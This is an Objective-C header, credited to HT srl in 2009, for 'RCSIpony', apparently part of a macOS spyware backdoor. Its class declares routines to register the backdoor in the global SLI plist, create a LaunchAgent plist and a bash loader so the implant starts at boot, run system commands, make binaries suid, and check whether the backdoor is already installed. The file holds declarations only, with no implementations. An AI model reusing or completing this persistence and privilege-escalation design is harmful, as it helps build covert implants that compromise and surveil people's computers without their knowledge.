/*
 * RCSIpony - Utils
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSIUtils_h__
#define __RCSIUtils_h__


@interface RCSIUtils : NSObject
{
@private
  NSString *mBackdoorPath;
  NSString *mKextPath;
  NSString *mSLIPlistPath;
  NSString *mServiceLoaderPath;
  NSString *mExecFlag;
}

- (id)initWithBackdoorPath: (NSString *)aBackdoorPath
                  kextPath: (NSString *)aKextPath
              SLIPlistPath: (NSString *)aSLIPlistPath
             serviceLoader: (NSString *)aServiceLoaderPath
                  execFlag: (NSString *)anExecFlag;

- (void)dealloc;

// 
// Execute a system command
// Arguments can be nil
//
- (void)executeTask: (NSString *)anAppPath
      withArguments: (NSArray *)arguments
       waitUntilEnd: (BOOL)waitForExecution;

//
// Add an entry to the global SLI plist file for our backdoor
//
- (BOOL)addBackdoorToSLIPlist;
- (BOOL)removeBackdoorFromSLIPlist;

// 
// Search the global SLI plist file for the given key, used for verifying if
// the backdoor is already present in the file
//
- (BOOL)searchSLIPlistForKey: (NSString *)aKey;

//
// Save the global SLI plist file
//
- (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath;

//
// Create the global SLI plist file from scratch
//
- (BOOL)createSLIPlistWithBackdoor;

//
// Create the launchctl plist file used for launching the Kext Loader script
//
- (BOOL)createLaunchAgentPlist: (NSString *)aLabel;

//
// Create the bash script which will load our backdoor from LaunchDaemons
//
- (BOOL)createBackdoorLoader;

//
// Returns YES if the backdoor has been already added to the global SLI file
//
- (BOOL)isBackdoorPresentInSLI: (NSString *)aKey;

- (id)openSLIPlist;

- (BOOL)makeSuidBinary: (NSString *)aBinary;
- (BOOL)dropExecFlag;

- (NSString *)mBackdoorPath;
- (void)setBackdoorPath: (NSString *)aValue;

- (NSString *)mKextPath;
- (void)setKextPath: (NSString *)aValue;

- (NSString *)mSLIPlistPath;
- (void)setSLIPlistPath: (NSString *)aValue;

- (NSString *)mServiceLoaderPath;
- (void)setServiceLoaderPath: (NSString *)aValue;

- (NSString *)mExecFlag;
- (void)setExecFlag: (NSString *)aValue;

@end

#endif
